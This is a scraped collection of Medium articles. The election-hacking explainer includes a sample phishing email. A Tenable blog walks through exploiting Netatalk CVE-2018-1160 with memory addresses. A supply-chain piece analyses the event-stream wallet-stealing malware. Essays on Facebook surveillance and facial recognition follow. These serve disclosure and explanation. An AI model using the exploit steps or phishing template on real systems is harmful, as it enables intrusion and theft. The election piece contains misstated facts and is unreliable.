What is the best defense against a bot army? There is really only one if you think you are infected.
THROW OUT your computers, throw out your routers and pipes and everything that created your network and buy totally new computers straight out of the warehouse and then you MIGHT be safe.
If your computer is logged onto the Internet for about ten minutes without any security then there’s a decent chance a bot has infected it.
There’s a #5, #6, #7 but they are more advanced versions of what I described above.
The one exception is not so much a hack INTO the network but a hack that destroys your network called a “denial of service attack”.
Since this is not related to the Russian election hack (yet) I’m not going to deal with it now.
The only thing I will mention is that often the reason a bot army is so dangerous is because they are very effective at initiating denial of service attacks to bring down a network.
When you hear something like, “Netflix was down from a hacker attack today” it usually means a massive bot army sent billions or even trillions of requests for “House of Cards” at the same second to Netflix and the Netflix servers went down.
And since the bot requests are coming from unsuspecting computers all over the world and hitting every open port at Netflix, it is very hard to block.
Congratulations! Those are the ABCs. Now for the more advanced stuff so you, too, can hack election systems on the world’s most powerful country.
B) PHISHING AND SPEAR PHISHING
As opposed to all the movies where hackers are trying to figure out passwords and do packet sniffing, etc. almost all hacking today begins with a Phishing email.
A Phishing email might look like this:
“Dear James,
Someone just tried three times in a row to unsuccessfully log into your Gmail account. At Google, we take security very seriously.
We will be shutting down your Gmail account effective immediately unless you log into our secure site and confirm that the Gmail log-ins were legitimate or not.
We also strongly suggest you change your password when you log into our security site.
Please click HERE to validate your account. Thank you.
– The Google Security Team”
“HERE” is a link to a page that looks like Google and the URL might be a bit.ly link, which looks somewhat obscure but we are used to seeing obscure shortened links so we might not care.
Once you click on HERE, you did two things:
– you notified the hackers that you are the type of person who can potentially respond to a Phishing attack. So even if you don’t proceed further, you might on the next one (coming, say, from your bank).
– you might type in your password. In which case, not only do the hackers instantly download all of your emails and storage, etc but they have access to your password, which means they probably know your password for Facebook, twitter, your company accounts, etc. (see above).
Millions of these phishing attacks are sent out every day and you can find them usually in your Spam folder. Often the ISP that provides you Internet access will recognize these attacks and block them before you see them.
SPEAR IT:
Which is why SPEAR PHISHING is often more effective and is the technique used in the “Russia hacks”.
SPEAR PHISHING is when the mail is directed very specifically TO YOU. You are “speared”.
This happened when Russian hackers attacked Norman Podesta at the DNC and revealed his various unusual tastes that embarrassed the Democratic campaign of Hillary Clinton.
It’s a spear because very specifically emails were sent to officials at the DNC and although I don’t know what they said, they probably had enough information about the recipient to make it even more likely that they would pass through the network security servers and make it more possible for Podesta to click the link.
In fact, the email was so specific, he apparently sent it to his IT department and said, “Is this real?” and they wrote back right away, “RESPOND TO THAT IMMEDIATELY!” So he did.
He logged into a fake server. Typed in his password, and the rest is history.
Another example of a spear phishing attach worth mentioning:
MALWARE
instead of clicking on a link and typing in a password the Phishing email might say,
“Hey John, here’s the latest info on the delegates in Indiana you should know about”.
Then there’s an attachment. John clicks on it. It’s a simple Microsoft Word document and John is working on a Microsoft Windows machine.
Microsoft Word, every now and then, has a security breach.
MS Word can talk to other pieces of software on the computer. For instance, the software that controls the printer. Or the software that controls the web browser. Or the software that controls the calendar.
And some MS Word documents are much more sophisticated and can download applications right into the operating system.
These applications can never be detected.
For instance, a hack that I “have never done” is where you get someone to accidentally download a “keystroke logger”.
The keystroke logger is installed inside the operating system and can never be detected.
It opens up a new port (see above) and starts sending every key ever typed. So you can get every password for every service the person uses and then do whatever you want.
The port sends all the passwords to a server that is offshore and untraceable. The hacker logs into it and sees all the information about who ever has the malware.
The ONLY solution if you suspect you have been hacked this way: change every password and throw away EVERY computer and phone you own.
I can say for sure: this type of attack works and is more common than people think.
People who are good at this form of attack should never even be allowed to touch a computer or phone because it might only take seconds to execute in one form or other.
C) WHAT WAS THE RUSSIAN SPEAR PHISHING ATTACK
The true answer, despite the NSA leak, is that we don’t know and will never know.
All we know are these facts:
– Some election company was targeted by someone in sophisticated Spear attack.– This was a “double spear” attack: once the first company was infiltrated, they used fake accounts at the first election company to then launch spear attacks at other election officials.
They speared and then went viral.
For instance, it’s one thing if you get a random email from someone. It’s another if you are an election official in Ohio and you get an email from someone who appears to be working at one of your election software vendors (the first company attacked and infiltrated) and they say, “Hey, we’re just testing the software to make sure Ohio is safe. Click HERE.”
The first successful Spear Phishing led to an even more successful Spear Phishing. Hence the “DOUBLE SPEAR”.
– According to the NSA leak, the initial Spear attack seems to have come from a Russian military team that is set up just to do Spear Phishing attacks against the US.
Similar to teams we probably have set up at the NSA, the CIA, the DIA, the FBI, and probably places with initials we don’t know.
What we DON’T KNOW:
– what information they received from us.– how they infected the software of the election vendors or the election offices– if they left any bots or malware behind (e.g. 2020 might be their target and not 2016).– who told them to do this. This was probably their normal jobs. It’s probably not the case that Putin made a specific call and said, “hack this software election provider”.
It’s more likely they have a general mandate to disrupt our elections all of the time in every possible way. Just like we have teams that do the same. This is not excusing them. This is reality.
What we SUSPECT but DON’T KNOW
– Did Trump, or someone from Trump’s camp, talk to Putin, or someone from Putin’s camp and said “don’t just disrupt the election but do something specific that hurts Hillary and helps Trump.”
We simply don’t know that although the inference is often made because the attack on Podesta seems like this attack was very focused on Democrats.
That said, Podesta and his IT team were particularly foolish and even Obama, afterwards, said, no election services were effected. But….he would really have no idea. Nobody would.
– WHAT SPECIFIC VENDORS WERE ATTACKED AND WHAT DAMAGE COULD THEY CAUSE?
According to the NSA leak, it’s still very unclear. Some possibilities.
A) VR SYSTEMS (and probably similar companies)
VR Systems makes an electronic poll book. This has nothing to do with counting votes.
This has entirely to do with how people register to vote.
For instance, when people come into vote they are either registered to vote or not. A database needs to be checked (it used to be all on paper until fairly recently).
The electronic poll book allows for quick checking, and even registering of new voters.
Two very bad things can happen if pollbook companies like VR are effected:
A) REGISTRATION SCREWUPS
Any damage or interference on an electronic poll book could cause voter turmoil among a targeted class of voters (e.g. Democrats, or people from a specific county, etc).
It doesn’t stop people from voting (there are backup ways to find out who is registered) but can make it so inconvenient that people give up.
If the Russians wanted the Republicans to win, for instance, they can disrupt or slowdown the registration checking process in mostly Democratic counties.
B) DEEPER PHISHING
Companies like VR Systems are in email contact with election officials in every state. It could be that pollbooks / registration systems were not the final target but a leaping off point for a deeper Spear Phishing attack.
An election official in Indiana can get an email from VR (as described above) that says, “Doing a last minute check. Click HERE”. And now the entire Indiana election system is in question FOREVER.
Not only registrations but these election officials are presumably also in contact with the software companies that COUNT votes. These companies can now be targeted for future elections.
My guess is this is what happened and the attacks are far from over.
– WHO IS GUILTY?
Possible guilty parties that have been mentioned include Russia, rogue groups within Russa, the Russian military that operated independently from Putin.
On the American side, guilty parties mentioned include: Trump, Jared Kushner, other people working for Trump, the Republican party, rogue participants that wanted influence, etc.
It’s also possible that Putin wanted Trump elected, he got his people to hack, and he never notified Trump’s team of this at all. There is no law broken here. But if evidence is found that this is true, some punishment (sanctions, tariffs, cyber warfare) would have to be put in place.
What do we know?
Nothing.
What is legal?
Unclear.
It’s grossly illegal to effect a US election.
But it’s also VERY UNLIKELY Trump (or anyone hired by Trump) simply called Putin (or anyone working for Putin) and said, “use your hackers to make sure I win the election.”
That would be incredibly stupid and so obviously illegal as to defy belief.
Here’s the worst case scenario: someone maybe working for Russia (maybe!) called someone maybe working for Trump (maybe!) and said, “we can do something” and the Trump person most likely said, inappropriately, “I don’t want to hear about it but…I DON’T want to hear about it”. In other words, a wink.
But this is not illegal. If this happened (which is just my worst-case scenario guess), the American side could have said, “Don’t do anything” but that might be just as illegal also (to have any communication whatsoever with a bad participant).
This is where guys like Comey and Flynn get involved and we still don’t know the extent of what they knew and who they spoke to.
The law is very unclear on ALL of this and even Democrat-leaning lawyer Alan Dershowitz has stated no crime was committed by a US citizen in terms of this attack or any influence on the elections. And Barak Obama, probably prematurely, said there was no direct attack on the US election system.
But….we don’t know and never will.
WHY IS THIS IMPORTANT?
So many US elections have been improperly influenced (Nixon 1972 is most prominent as an attempt to influence, Reagan 1980 and his pre-election discussions with Iran were an influence, Kennedy in 1960 in Chicago was an influence, and probably every pre-Kennedy election) that it is not a trivial issue.
Every year there are improvements to the systems to prevent any influence. A lack of faith in the election system would be a lack of faith in the entire republic that the system creates.
As much as I dislike the way the system is built and think there are opportunities to rebuild from the ground up, this is the reality and the law.
CAN HACKERS EFFECT THE SYSTEM?
Yes, and they probably have, and their ability to do so again is probably stronger than ever.
ARE AMERICANS INVOLVED?
No, probably not. When you let the thief in door, nobody is safe, not even people who think they are colluding. Everyone knows this.
BUT…Americans certainly hack the elections of others just like many attempt to hack our elections. This is my guess but why wouldn’t it be true?
CONCLUSION:
A) The US election system is hacked beyond belief.
– Passwords of top officials are known– Computers are sending every keystroke to bad agents– Bot armies are ready to shut down election centers at the press of a button– registration software is probably hopelessly infected– vote counting software is probably effected but this is much more difficult since there are many backup systems for storage and replication of counting.
B) Hacking is not difficult.
When a team of fairly intelligent people are spending 24 hours a day trying to infiltrate 100s of companies, bad things are unavoidable. There is no stopping this.
C) WHAT CAN WE DO?
1) Awareness is the key.
– party officials can be hacked and embarrassed (Podesta, Hillary, etc), grossly effecting elections.
– registration software can be hacked. Awareness includes backup systems that are disconnected from each other and used to check each other’s work.
– vote counting software can be hacked.
– electors, congressman, election officials can be blackmailed when their emails are read.
2) Punishment of bad parties
At the hint of any other government involvement (or even country involvement without the government being aware) we should threaten immediate sanctions that can’t be stopped without some sort of super majority in Congress.
This would incentivize other governments to work to prevent any hacking of our elections.
3) Mutual Assured Destruction
While cyber warfare is different than nuclear warfare, we should certainly scale up our own efforts to be “bad agents” towards every other government.
Knowledge is power and, unfortunately, hacking gets the knowledge.
4) What about fixing the problem on our side?
Answer: it CANNOT be fixed with better software. Again, however smart the “good agents” are, the “bad agents” are simply smarter and it’s easier to break in than to block.
HAVE I LEFT ANYTHING OUT?
Yes.
I’ve left many many things out. These are the basics.
But the basics provide enough knowledge to understand what is happening in the news, how to learn more about basic hacking, what actually probably happened in the US election, and what the probable involvement of everyone was.
I’m sure we’ll be learning more. But we’re not going to be learning that much more .
The reality is: we were hacked more than will ever be revealed. And the hacking will cause damage.
And like the 44 elections prior, most of which have been manipulated, the US will survive, flourish, and move forward like it always has done.
You might also like…
[Will The United States Remain A World Power?]
AND
[Why We Should Abolish the Presidency]
James Altucher is the author of the bestselling book Choose Yourself, editor at The Altucher Report and host of the popular podcast, The James Altucher Show , which takes you beyond business and entrepreneurship by exploring what it means to be human and achieve well-being in a world that is increasingly complicated. Join the 136,000 readers getting a dose of my best and controversial content. Join here.
Written by
","['Cybersecurity', 'Russian Hacking', 'Elections', 'Trump', 'Hacking']"
Explainer: What Is Quantum Communication? - MIT Technology Review - Medium,https://medium.com/mit-technology-review/explainer-what-is-quantum-communication-527bb0f5d987?source=tag_archive---------7-----------------------,"By Martin Giles
Barely a week goes by without reports of some new mega-hack that’s exposed huge amounts of sensitive…
Written by
","['Technology', 'Quantum Computing', 'Data Science', 'Science', 'Cybersecurity']"
Exploiting an 18 Year Old Bug - Tenable TechBlog - Medium,https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172?source=tag_archive---------6-----------------------,"Recently, I found and disclosed CVE-2018–1160. This really old bug in Netatalk allows remote unauthenticated attackers to overwrite some struct data. I leveraged this bug to bypass authentication and gain full control of the AFP volumes. This blog is about finding and exploiting the bug. If that doesn’t sound interesting then you probably won’t like this proof of concept video either.
Netatalk is an implementation of the Apple Filing Protocol (AFP). The project itself is quite old. The first import into Sourceforge dates back to 2000, but the project itself is still older than that. This is a comment in main.c:
Netatalk isn’t nearly as popular as it used to be. Other network file sharing protocols have eclipsed AFP in popularity (I’m looking at you SMB). However, Netatalk still sees a respectable amount of downloads on Sourceforge, and it has a package in the official repository of a number of Linux distros. I also found Netatalk on a whole lot of routers and NAS. So it’s still chugging along.
I’d love to tell you there are a billion Netatalk servers on Shodan. Unfortunately, Shodan doesn’t scan for AFP. So you’ll just have to believe me when I say, “There are totally people that use this.”
Netatalk has a mistake that has gone unnoticed, as far as I can tell, since the original import into Sourceforge back in 2000.
The mistake is actually quite simple. Here’s how it looks in Netatalk 3.1.11:
Do you see it? Probably not. I’ve withheld crucial information. What if I told you that dsi->attn_quantum a 4 byte integer and dsi->commands is attacker controlled? Now do you see it?
Look at the memcpy. Two attacker controlled parameters are used to copy data into an integer. An attacker controls the the source (dsi->commands + i + 1) and the size (dsi->commands[i]). Because dsi->commands is a char array the size parameter is limited to a maximum value of 255.
Before you start reaching for your “AAAAAAAAAAAAAAAAAAAAAAAA”, let’s check what we can actually overwrite. From include/libatalk/dsi.h:
Due to the massive black hole located in the data array, we can only overwrite datasize, server_quantum, serverID, clientID, the commands pointer, and partially into data.
People always want to know, “How did you find that bug?” They want to hear, “taint analysis.” They sigh when they hear, “intermediate language.” They beg to see the seed corpus. They’re dying to hear about your cutting edge research.
I found this bug on a 3 hour flight from Austin to Philadelphia. I was flying home from a meeting and planned poorly. I didn’t have much to do. I had the Netatalk source on my laptop for a NAS project I was hoping to get around to. I just started reading the source at main.
How’s that for fancy research?
Trust, but verify. I get it.
A unique property of this vulnerability is that one of the overwritten variables, server_quantum, gets reflected back to the attacker. Check this out, the following will send a well formed DSI Open Session request to the server.
The server response contains a “quantum” value that’s originally defined in a configuration file. In the Wireshark screenshot, you can see the quantum value is advertised as 0x100000 or 1048576.
Let’s overwrite that value. We just update our dsi_opensession payload to provide a length (0x0c) that will write beyond the integer.
Now the response shows 0xdeadbeef to be the server’s quantum value.
Reflecting an overwritten value is neat and all, but it’s just not useful. We want execution control. We need a path forward. But our options are limited. Of the five variables we can overwrite only commands seems to have any promise.
The life of the commands pointer begins shortly after a new connection is forked to its own process. A chunk of heap memory is allocated and assigned to commands when the dsi struct is initialized. Every incoming AFP message is written into the commands pointer before being processed by Netatalk’s AFP functions. The commands memory isn’t freed from existence until shortly after the connection is terminated and just before the process exits.
commands passes through the system based on a global jump table pointer defined in etc/afpd/switch.c called afp_switch. afp_switch points to a jump table that contains 255 entries. Each entry is either NULL (not implemented) or a function that processes the AFP data in commands.
afp_switch points to one of two versions of the jump table. One is called preauth_switch and it contains the only four functions that unauthenticated users can invoke. preauth_switch is the default afp_switch table. The second jump table is postauth_switch, and it gets swapped into afp_switch after the user has authenticated.
Here is the (simplified) logic for calling jump table functions from etc/afpd/afp_dsi.c:
Seems to me that we have a “write anything anywhere” vulnerability on our hands. This should be easy! Just follow these four easy steps:
The question becomes, “What address do we write to?” That is indeed a difficult question and one we might not always be able to answer. For example, on Ubuntu, where ASLR is enabled by default, the official Netatalk package has been compiled to be position independent. We don’t know any addresses ahead of time. In that case, we don’t have enough information to move forward.
But “when reason fails, the devil helps!” Enter stage right, embedded systems.
For the remainder of this blog I’ll be focusing on a specific Seagate NAS. It isn’t that the NAS is a horrific security abomination or anything. Seagate simply made one little oversight: they didn’t compile Netatalk as a position independent executable. That’s all we need.
We want to overwrite the commands pointer with the preauth_switch address. Did I jump ahead there? Here is why:
The first challenge is finding the preauth_switch address. The preauth_switch, unlike the postauth_switch, only has local linkage. That means if the binary is stripped then the preauth_switch symbol will be removed from the symbol table. Here are two examples:
In the binary I extracted from a Netgear device, you can see that we can easily pull out the preauth_switch address (0x8395c). However, the Seagate binary is stripped so we need to look a scratch deeper. Pop open your favorite disassembler and locate afp_switch.
You can see that preauth_switch starts at 0x63b660.
What do we write into the preauth_switch? How about a function that requires authentication? We’ll prove that we can control the execution flow and bypass authentication. A good candidate is afp_getsrvrinfo. afp_getsrvinfo is just like DSI GetStatus except over authenticated AFP.
We can find afp_getsrvinfo in the sixteenth entry of the postauth_switch.
To execute this plan we need to update our script to overwrite the command pointer with the preauth_switch address (0x63b600).
Each subsequent AFP request after on the same connection will be written to 0x63b660. As such, we just need to figure out which table index we want to write the address of afp_getsrvrinfo to. We know that the first byte of the AFP message is the command and the command is used to do the table lookup.
We can’t write the afp_getsrvrinfo address to table index 0 since the index is partially used up by the command byte. But index 1, starting 8 bytes into the table, is open. If we write the afp_getsrvrinfo address into index 1 then we should be able to invoke it by setting our AFP requests command byte to 1.
We haven’t yet learned the afp_getsrvrinfo address though. Let’s remedy that.
Finally, we construct the AFP message that will invoke afp_getsvrinfo. The dsi_header portion looks almost exactly as before except we need to update the second byte to indicate the payload is an AFP command. Also, we need to increment the request ID. The afp_command starts with a 1 like we talked about above and then pads until we can write the address for afp_getsvrinfo in the tables second entry.
This is sort of an overly large mess for a blog, but here is what the entire script looks like in the end:
Nothing left to do now but test it!
Success!
What? Failed to render UTF-8 characters don’t look like success to you? Well, you’re wrong. This is what success looks like. This is exactly what we expect from the afp_getsvrinfo command. We just didn’t implement the parsing.
Notice, in the screenshot below, that Wireshark thinks we’re executing the afp_bytelock function (postauth_switch table entry 1). Wireshark also fails to parse the payload because… well, the payload isn’t from afp_bytelock.
The full exploit is more complicated than all that. We need to make room for parameter passing and implement AFP message parsing. But that’s all rather tedious. I assure you, it was no fun to code. I’m certain it would be less fun to blog. If you’re interested though, you can find the full exploit on our GitHub.
The Netatalk developers released a larger patch to fix this issue, but the most important part is highlighted below. Just a simple length check is all that was needed.
I mentioned previously that this memcpy error appears to predate Netatalk’s import into Sourceforge. However, I was trying to exploit a Netatalk 2.2.5 (released in 2013) on a Netgear router and it wasn’t working. It turns out that the DSI struct was altered in Netatalk 3.0.1 (released in 2012) but not backported to 2.x. The change allows us to overwrite the commands pointer.
Isn’t git blame just wonderful?
Written by
","['Vulnerability', 'Hacking', 'Exploit', 'Cybersecurity', 'Infosec']"
Exploiting Developer Infrastructure Is Ridiculously Easy,https://medium.com/s/story/exploiting-developer-infrastructure-is-insanely-easy-9849937e81d4?source=tag_archive---------0-----------------------,"In late October, an issue was opened on an extremely popular node.js tool, nodemon, describing a deprecation warning that was being logged to the console.
Warnings like these aren’t uncommon. This one seemed harmless. It wasn’t even related to the nodemon project, but rather to one of its dependencies. This easily could have gone completely ignored because, in many cases, warnings like these often resolve themselves.
About three weeks after the initial report, Ayrton Sparling experienced the log output himself and found that a new dependency several layers deep was the cause of the warning. The output was coming from a strange bit of code at the end of a minified JavaScript file that did not exist in an earlier version and had been removed in a later version (compare flatmap-stream@0.1.0, flatmap-stream@0.1.1, and flatmap-stream@0.1.2). Ayrton’s research led him to a popular npm library, event-stream, which is downloaded nearly two million times a week and, up until recently, was maintained by a reputable open-source developer.
Several months ago, control of event-stream changed hands, legitimately, to a relatively unknown user who asked for publishing rights over email. This user then updated event-stream to include the exploited flatmap-stream dependency in a patch version and then bumped the major version of event-stream without the dependency to limit the visibility of the change. New users who, presumably, are a little more inclined to question dependencies would get the latest version (4.x as of this writing) and users who depend on the previous version would automatically update to the infected patch release whenever npm install runs again (with many common configurations).
The payload on flatmap-stream was set up to ingest a data file that had, among some trivially obfuscated strings, two encrypted payloads that could only be decrypted with a known password.
This payload looked for the password in an environment variable named npm_package_description set by npm, node’s package manager. This environment variable is set to the root package’s description, which allows this payload to scope its effects to a particular target package. Clever! In this case, the package was the client application for the bitcoin wallet Copay and the password to decrypt the payload is the phrase “A Secure Bitcoin Wallet” (found via brute force by Github user maths22).
After payload A successfully decodes the first entry in the test data, it executes payload B included below:
This code then makes sure to only continue executing if the script is being run with a particular command line argument, something that follows the pattern “build:*-release”, like npm run build:ios-release. This isolates the execution down to only three build scripts in the Copay build pipeline, the scripts in charge of building the hybrid iOS, Android, and desktop applications.
The script then searches for the internals of another dependency of the application, ReedSolomonDecoder.js from the package @zxing/library. Payload B doesn’t execute this file, it simply injects the next stage, payload C, so that this final payload is executed in the mobile application itself when ReedSolomonDecoder loads. A beautified payload C is included below.
Payloads A and B were to be run via node.js by way of npm on a build server somewhere, but payload C is intended to be run within a browser-like environment controlled by Cordova. Cordova (previously PhoneGap) is a framework that allows you to build native applications with web technology like HTML, CSS, and JavaScript. Copay’s iOS, Android, and desktop clients (along with forks like FCash) are all built with Cordova and this is where the damage occurs. These native applications are intended to be used by end users looking to manage their bitcoin wallets—and that’s precisely what this is intended to steal. This script manages the passing of data around in multiple contexts and eventually posts the target data to the servers at copayapi.host and 111.90.151.134.
So much software is built on the backs of people who are expected to work for free.
The amount of effort this took was not trivial. This exploit took a lot of research and planning, and it likely had backup routes in the case that event-stream wasn’t able to be hijacked. Given the way the attack played out, it seems plausible that the actor targeted Copay specifically rather than grabbing a valuable library and planning out an attack from there. The popularity of event-stream meant that the attacker had an easy route into privileged computers in hundreds of companies across the globe. Thankfully, it was limited and quickly caught considering how long it could have gone unnoticed, but thinking about what could have happened leads us to an obvious conclusion:
Let’s count all the things that went wrong.
The damage this could have caused is incredible to think about. The projects that depend on this aren’t trivial either. Microsoft’s original Azure CLI depends on event-stream. Think of the systems that either develop that tool or run that tool. Each one of those potentially had this malicious code installed.
Open source is broken, and the larger it grows the more likely that catastrophic events will occur.
The problem is that so much software is built on the backs of people who are expected to work for free. They deliver useful software once but are expected to maintain it until the end of time. If they can’t, either they go dormant and ignore requests or security vulnerabilities (guilty!) or they pass the baton to someone else hoping they can get away without getting tagged ever again. Sometimes it works. Sometimes it doesn’t. But no outcome can excuse the security vulnerabilities this exposes in the software supply chain. Even the discovery of, research into, and subsequent damage control for this exploit was done largely by unpaid volunteers of the open-source ecosystem.
The fault is so widely distributed there’s no use in placing blame. Open source, as it has grown, is broken. The larger it grows, the more likely it is that catastrophic events will occur. Given the potential for damage with this exploit, the fact that it was so limited is a blessing. It’s also not limited to node.js or npm; there is just as much misplaced trust in sister ecosystems like Python’s pypi and Ruby’s gems — and with Github as a service itself. Anyone can publish to these, and control can change without any notice. Even without a change of control, there’s so much code that thoroughly vetting it all in the first place would grind any team to a halt. In order to meet timelines, developers install what they need to install, and security teams and automated tools just aren’t able to adapt to the pace of ever-changing software.
Written by
","['Thousands', 'JavaScript', 'Nodejs', 'Programming', 'Cybersecurity', 'Open Source']"
Facebook Is Just Like the NSA - Featured Stories - Medium,https://medium.com/s/story/facebook-is-just-like-the-nsa-22c43f236ff5?source=tag_archive---------7-----------------------,"“Know that every border you cross, every purchase you make, every call you dial, every cell phone tower you pass, friend you keep, article you write, site you visit, subject line you type, and packet you route, is in the hands of a system whose reach is unlimited but whose safeguards are not.”
This’s what Edward Snowden wrote to filmmaker Laura Poitras when he first made contact with her in 2013 regarding the NSA’s tracking and interception systems. Yet, ever since Facebook came under closer public scrutiny following the 2016 election, Snowden’s warning to Poitras reads increasingly like it could have been written about the social platform as well.
We now know the seemingly unlimited reach of Facebook’s data mining operation. We know that it has in the past, and may still, track what you write — and delete — from its site, monitor the websites you visit, where you go (even when you’re offline), record the applications you and your friends install, and more. Somewhere, Facebook may even know how much money you have.
We also know that Facebook can allow users to be targeted with ads using contact information they’ve never even posted on the site. As Kashmir Hill reported for Gizmodo Thursday, Facebook trawls associated accounts and records looking for, say, a phone number besides the one you may have put in your contact information. Facebook then allows advertisers to use that number to target an ad to your News Feed.
In other words, we know about Facebook’s seemingly unlimited reach. As of last week, we also now know the limitations of its safeguards.
On Friday, at least 50 million Facebook users received a security message, alerting them that their account had been compromised. Someone, somewhere, hacked the platform and gained access to tens of millions of accounts. It was the largest security breach in Facebook’s history.
According to Facebook, the hacker(s) exploited a flaw that “allowed them to steal Facebook access tokens… the equivalent of digital keys that keep people logged in to Facebook so they don’t need to re-enter their password every time they use the app.” Already, some users have launched a class action lawsuit against the company, citing the “continuing and absolute disregard” with which Facebook “has chosen to treat the [personal information] of account holders.”
People who once wished to learn what it might be like to surveil themselves as someone else are now actually being surveilled.
The platform’s vulnerability apparently resided somewhere within the code for Facebook’s “View As” feature, which allows users to see their own profile as if they were someone else. In addition to the 50 million accounts with known security issues, Facebook is also notifying 40 million more people “that have been subject to a ‘View As’ lookup in the last year,” that they might be affected.
What does this mean? People who once wished to learn what it might be like to surveil themselves as someone else are now actually being surveilled. This time, by hackers.
It’s a nice summary of how, despite the Snowden revelations, surveillance has become more than merely accepted in the last few years. It’s now something we regularly partake in of ourselves. We’ve become practitioners, rather than protesters.
Last year, in the pages of New York, Max Read wondered whether Facebook’s founder and CEO, Mark Zuckerberg, really had any idea what his platform actually is. “Facebook has grown so big, and become so totalizing, that we can’t really grasp it all at once,” Read wrote. “Like a four-dimensional object, we catch slices of it when it passes through the three-dimensional world we recognize.”
At the time, Zuckerberg had embarked upon a cross-country tour — the latest in a series of ambitious annual side projects he assigns to himself (previous projects include eating meat only from animals he’s “killed himself”) — that led many to speculate about whether he was planning a run at politics. Watching Zuckerberg interact with laypeople in every state, Read tried to come to grips with what he was seeing.
“If Facebook is bigger, newer, and weirder than a mere company, surely [Zuckerberg’s] trip is bigger, newer, and weirder than a mere presidential run,” he wrote, before running down a long list of possibilities — including, of course, that “Facebook is a surveillance state” and Zuckerberg is filling the role of a “dictator undertaking a propaganda tour.”
But all Mark Zuckerberg was really doing was extending the purpose of his website. He was gathering information. For all the ways that Facebook might now resemble a tool of a surveillance state — if not a surveillance state itself — this one similarity seems most striking: the shared philosophy of data collection.
Facebook wants to unite the people of Earth — if not ideologically or politically, at least technologically. How…? By finding out as much as possible about you and using that information to connect you to other parts of its network.
As James Bridle writes in New Dark Age: Technology and the End of the Future, the NSA believes that “there is some secret at the heart of the world that, if only it can be known, will make everything better.” To arrive at this secret, it collects as much information as it can, from as many sources as possible, under the impression that, at some point, it will all fit together to make the world clearer and more knowable. Disasters might be averted, terrorist plots foiled. Total knowledge equals total protection.
Facebook believes the same thing, with a twist. As Zuckerberg wrote in his manifesto last year, and highlighted in bold, Facebook wants to “develop the social infrastructure to give people the power to build a global community that works for all of us.” Zuckerberg, and by extension, Facebook, want to unite the people of Earth — if not ideologically or politically, at least technologically.
How does Facebook do that? By finding out as much as possible about you and using that information to connect you to other parts of its network. Facebook appears to believe there is a secret at the heart of the world that, if discovered, could make all of our lives immeasurably better. It collects our data, searching obsessively and trying to solve the riddle. If only Facebook could know everything about everyone, the theory goes, it could unite us all.
Ultimately, whether it’s the NSA or Facebook, the logic of the system dictates that at some point these entities — government and corporate — will know us better than we know ourselves. Only then will some form of a perfect society be achieved. The question now, as in 2013, is whether we believe such a goal is achievable. And whether the tradeoffs — like last week’s monumental data breach — are worth enduring as we wait for that vision to become reality.
One assumes the easy answer is “no.” Recent history might suggest otherwise.
Written by
","['Cybersecurity', 'Social Media', 'Facebook', 'Privacy', 'Data Science']"
Facial Recognition Technology and What It Means for Data Privacy and Protection,https://medium.com/@AxelUnlimited/facial-recognition-technology-and-what-it-means-for-data-privacy-and-protection-fe232847220d?source=tag_archive---------7-----------------------,"Imagine walking into a store, picking up a pint of milk, heading to the cash desk, shooting the cashier a smile, and going on your merry way.
No card, no cash, no phone; just your face as a tool.
This might not be a far cry from what the future holds thanks to facial recognition.
Today, cameras are no longer just vessels to take pictures and record videos with. Instead, they are being fitted with biometric technology which can identify humans and perform key activities, like unlocking a smartphone or, more amazingly, making payments.
Take the recent news story of a man who was caught at a music festival via facial recognition. Technology picked the suspect out of thousands of revelers — crazy, right?
In other news, Europeans have blasted Facebook for providing them the chance to “turn on” the app’s facial recognition feature, only to find out later on that the message was sent in error.
It’s safe to say that facial recognition is causing a stir in a lot of different industries.
Typically used as a security system, facial recognition uses technology to verify a person’s features via a digital image stored in a database. The technology essentially examines the elements on someone’s face and matches it against images already stored to identify said person.
Though it has been around since 2009, the technology has only recently made waves in the retail world and for smartphone developers.
Take Alibaba, the Chinese version of Amazon, that lets people pay with a smile using facial recognition in its stores.
That scenario at the start of the post doesn’t seem so far off now, does it?
But perhaps the most popular place we’re seeing facial recognition pop up is in the world of smartphones. We just have to look at the latest iPhone X with its built-in Face ID capability to see where things might be headed.
This particular feature uses biometric authentication to let iPhone users unlock their devices simply by looking at the screen. It’s kind of like the finger-print Touch ID system that was used on previous iPhones, but the Face ID element now also lets users access Apple Pay, the App Store, iTunes, and other third-party apps by just showing their face.
When the new iPhone was released, Apple itself put forward a hefty claim. They said there was a 1 in 1,000,000 chance that someone could open up another person’s phone using Face ID — a pretty vast improvement from the 1 in 50,000 chance of someone having the same fingerprints as you.
It’s not just used for access rights either.
Let’s head to the city of Shenzhen in China for a moment. Here, facial recognition is used to identify jaywalkers in CCTV footage before showcasing their faces on a big screen in an attempt to shame them.
Compared to simply using your face to unlock a phone, this seems a little more dramatic, right? Kind of like it’s been taken straight from the pages of 1984.
Basically, facial recognition is being used in many different ways because it’s more convenient. I mean, just looking at your phone is a much easier way to unlock it than having to hold your finger down on a button or type in a password.
But, while we’re constantly told we’re all unique and no two faces are the same, how secure is facial recognition really? It may well be more convenient, but does convenient mean secure?
In an attempt to trick Face ID, Wired Magazine bought hundreds of expensive masks and brought biometric hackers on board to see just how secure this new technology was on the iPhone X.
Guess what? They failed to beat the system, but that doesn’t mean there aren’t other security and privacy issues.
While our passwords are predominantly kept a secret (unless you’re careless enough to leave them lying around or make them so easy even a 3-year-old could guess them), our faces are on show for everyone to see all the time.
Tech aside, we use our faces to verify ourselves to friends, family, and colleagues every single day.
But here’s the difference: when we’re verifying ourselves in real life, our faces are also combined with our traits, like our voice or our personality, which adds an extra dimension to the party.
With tech-based facial recognition, this isn’t the case — yet.
Say, for example, you’ve been captured by criminals and they want to hack into your smartphone to get some really juicy information you’ve got stored there. If you’ve got a password, they might have to work a little harder than normal to get into it, but with facial recognition they just need to hold the phone in front of your face.
There are steps being made to eliminate the chance of this happening (though hopefully you’ll never be taken captive by criminals in the first place). Face ID now uses machine learning to analyze expressions to figure out whether you really want to unlock your phone.
If that sounds crazy, it’s probably because it kind of is. What it basically means is that Face ID won’t work if you’re not awake or conscious, or simply not facing your phone.
But apart from the probably very minimal chance of someone getting captured by criminals who want to gather intel from their smartphone, there are other very real worries that come with facial recognition, like:
This just shows that, despite the advances in tech bringing weird and wonderful benefits, there are also significant concerns surrounding it, particularly because the data being used and held is biometric (or extremely sensitive) data.
Because of this, data privacy is one of the biggest worries.
Think about it: no data is completely safe, so your very unique and sensitive face data could potentially be accessed and used by third parties without your consent if the system is hacked.
